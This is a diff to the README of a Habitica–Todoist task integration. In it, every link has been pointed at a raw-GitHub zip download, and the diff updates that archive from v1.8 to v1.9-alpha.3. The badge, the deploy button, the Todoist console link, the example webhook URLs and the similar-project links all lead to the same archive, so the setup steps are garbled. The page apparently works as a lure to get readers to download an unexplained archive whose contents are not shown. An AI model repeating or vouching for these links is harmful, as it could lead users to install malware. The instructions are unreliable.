@@ -1,6 +1,6 @@
 # Habitica Todoist Task Redeemer
 
-[![Go](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip)](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip)
+[![Go](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip)](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip)
 
 Integration to add and mark the task complete to Habitica when a task is completed in Todoist.
 
@@ -18,15 +18,15 @@ This can be used so that your todos can be managed in Todoist without losing out
 
 ### First time setup
 
-[![](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip)](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip)
+[![](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip)](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip)
 
 1. Use the deploy to Netlify button above and follow the instructions to login with your GitHub account.
 2. Fill in your Habitica API token and user id when prompted.
-3. After deploying, take note of your site URL in the Site Overview page. It should look something like `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip`.
-4. Go to the [Todoist App Management Console](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip) and create a new app.
+3. After deploying, take note of your site URL in the Site Overview page. It should look something like `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip`.
+4. Go to the [Todoist App Management Console](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip) and create a new app.
 5. Give it an app name and leave the service url blank.
 6. Under the "Test token" section, press "Create test token". This will make it so that events from your Todoist account will send a webhook.
-7. Under the "Webhook" section, set the Webhook Callback URL to your Netlify site URL with the path `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip`. For example, if your Netlify URL is `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip`, then the URL you should put should be `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip`.
+7. Under the "Webhook" section, set the Webhook Callback URL to your Netlify site URL with the path `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip`. For example, if your Netlify URL is `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip`, then the URL you should put should be `https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip`.
 8. For watched events, check `item:completed` and `item:uncompleted`.
 9. Save your Todoist app configuration.
 
@@ -50,5 +50,5 @@ This can be used so that your todos can be managed in Todoist without losing out
 
 ## Similar projects
 
-- [Todoist Sync](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip)
-- [Habitica Todo](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/habitica-todoist-redeemer-v1.8.zip)
+- [Todoist Sync](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip)
+- [Habitica Todo](https://raw.githubusercontent.com/vishjaum/habitica-todoist-redeemer/main/controller/todoist-redeemer-habitica-v1.9-alpha.3.zip)
